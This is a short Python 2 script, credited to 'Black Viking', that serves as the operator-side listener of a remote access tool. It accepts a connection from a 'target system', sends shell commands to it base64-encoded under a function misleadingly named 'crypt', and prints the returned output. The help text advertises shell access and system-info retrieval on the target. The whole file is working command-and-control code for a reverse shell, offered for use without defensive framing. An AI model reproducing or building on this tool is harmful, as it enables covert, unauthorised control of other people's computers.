#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
[~] Author : Black Viking
[~] Version: 0.1
"""

import socket
import os
import sys
import base64

reload(sys)
sys.setdefaultencoding("utf-8")

host = "127.0.0.1"
port = 8000

def crypt(TEXT, encode=True):
    if encode == True:
        return base64.b64encode(TEXT)
    else:
        return base64.b64decode(TEXT)

def help():
    print"""[*] You can use target system's shell
[*] You can show messages, just type 'message test'
[*] You can get target system's info, type 'info()' """
    menu()

def main():
    global s, cli, addr, hostname
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    cli, addr = s.accept()

    hostname = crypt(cli.recv(1024), False)

def menu():
    while True:
        command = raw_input("[%s@%s]~$ "%(hostname, addr[0]))
        if command == "clear()":
            os.system("cls") if os.name == "nt"  else os.system("clear")
        elif command == "help()":
            help()

        elif command == "": x = " "
        cmd = crypt(command)
        cli.sendall(cmd)
        print(crypt(cli.recv(4096), False))


if __name__ == "__main__":
    main()
    menu()
